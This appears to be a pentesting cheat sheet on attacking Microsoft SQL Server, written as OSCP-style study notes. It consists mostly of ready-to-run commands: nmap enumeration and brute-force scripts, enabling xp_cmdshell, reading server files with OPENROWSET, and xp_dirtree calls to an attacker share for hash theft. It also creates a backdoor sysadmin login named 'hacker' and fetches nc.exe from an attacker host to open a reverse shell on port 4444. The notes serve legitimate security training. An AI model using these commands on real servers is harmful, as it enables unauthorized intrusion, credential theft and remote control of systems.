---
title: "1443 - MsSQL"
classes: single
ribbon: LightBlue
categories:
  - notes
tags:
  - beginner
  - pentest
  - recon
  - oscp
  - mssql
toc: true
hide_title: true
excerpt: ""
---

**Microsoft SQL Server**

## Nmap Scripts

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.3
```

# Connecting to MsSQL from Windows

```
sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30
```
# Connecting to MsSQL from Linux

`Remember! after command type 'go'`

```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
# Windows Authentication mechanism is used by the MSSQL server
```

# MsSQL Commands

| MSSQL Command                                                                                                      | Description                                                                                                                                        |
| ------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| `select @@version;`                                                                                                | Show DB version.                                                                                                                                   |
| `select user_name();`                                                                                              | Show current user.                                                                                                                                 |
| `SELECT name FROM master.dbo.sysdatabases`                                                                         | Show all available databases in MSSQL.                                                                                                             |
| `USE htbusers`                                                                                                     | Select a specific database in MSSQL (`htbusers`).                                                                                                  |
| `SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`                                                                 | Show all available tables in the selected database (`htbusers`) in MSSQL.                                                                          |
| `SELECT * FROM users`                                                                                              | Select all available entries from the `users` table in the currently selected database in MSSQL.                                                   |
| `EXECUTE sp_configure 'show advanced options', 1`                                                                  | To allow advanced options to be changed.                                                                                                           |
| `EXECUTE sp_configure 'xp_cmdshell', 1`                                                                            | To enable the `xp_cmdshell` extended stored procedure.                                                                                             |
| `RECONFIGURE`                                                                                                      | To be used after each `sp_configure` command to apply the changes.                                                                                 |
| `xp_cmdshell 'whoami'`                                                                                             | Execute a system command (`whoami`) from the MSSQL server.                                                                                         |
| `SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`                 | Read the content of a local file (`C:/Windows/System32/drivers/etc/hosts`) on the MSSQL server.                                                    |
| `EXEC master..xp_dirtree '\\\\10.10.110.17\share\'`                                                                | Display the directory and file structure of a network share (`\\\\10.10.110.17\share\`) using `xp_dirtree` in MSSQL (potential for hash stealing). |
| `EXEC master..xp_subdirs '\\\\10.10.110.17\share\'`                                                                | Display the subdirectories of a network share (`\\\\10.10.110.17\share\`) using `xp_subdirs` in MSSQL (potential for hash stealing).               |
| `SELECT srvname, isremote FROM sysservers`                                                                         | Identify linked servers configured in MSSQL and whether they are remote.                                                                           |
| `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Execute a query on the linked server (`[10.0.0.12\SQLEXPRESS]`) in MSSQL, identifying server name, version, user, and `sysadmin` role membership.  |
| `CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'`                                                               | Create account.                                                                                                                                    |
| `EXEC sp_addsrvrolemember 'hacker', 'sysadmin'`                                                                    | Add sysadmin priv to account.                                                                                                                      |
## BruteForce

```
nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt $ip
```

## RCE with SQL Server

```
mssqlclient.py <domain>/<username>:<password>@$ip

mssqlclient.py bathry/admin:pss123@192.168.11.15
```

```
SQL> enable_xp_cmdshell 
# Enable Code Execution

SQL> xp_cmdshell copy \\10.10.16.26\gabbar\nc.exe %temp%\nc.exe 
# Copied the Nishang reverse shell to current directory

SQL> xp_cmdshell %temp%/nc.exe -e cmd.exe 10.10.16.26 4444
# Start
```


